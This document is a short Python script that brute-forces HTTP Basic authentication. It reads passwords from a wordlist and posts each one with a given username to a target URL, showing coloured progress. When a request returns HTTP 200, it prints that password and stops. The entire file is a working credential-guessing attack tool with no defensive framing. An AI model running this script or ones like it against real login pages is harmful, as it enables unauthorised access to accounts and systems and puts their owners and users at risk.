import requests
import sys

if len(sys.argv) < 2:
  print("USAGE: un0.py [HOST] [PAYLOAD] [USERNAME]")
  sys.exit()

url = sys.argv[1]
pyld = sys.argv[2]
usr = sys.argv[3]
myobj = {'Username': 'Password'}

red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
white = "\033[1;37m"
r = "\033[m"

with open(pyld) as payload:
  lines = payload.readlines()
  for i,line in enumerate(lines):
    pswd = line.split('\n')[0]
    x = requests.post(url, data = myobj, auth = (usr, pswd))
    progress = int(i / len(lines) * 100) + 1
    if x.status_code == 200:
      sys.stdout.write(f"\r{white}{x.status_code} {i}/{len(lines)} %{progress} {green}{pswd}{r}        ")
      sys.stdout.flush()
      break
    else:
      sys.stdout.write(f"\r{white}{x.status_code} {i}/{len(lines)} %{progress} {red}{pswd}{r}        ")
      sys.stdout.flush()
    
print() # To prevent the % character
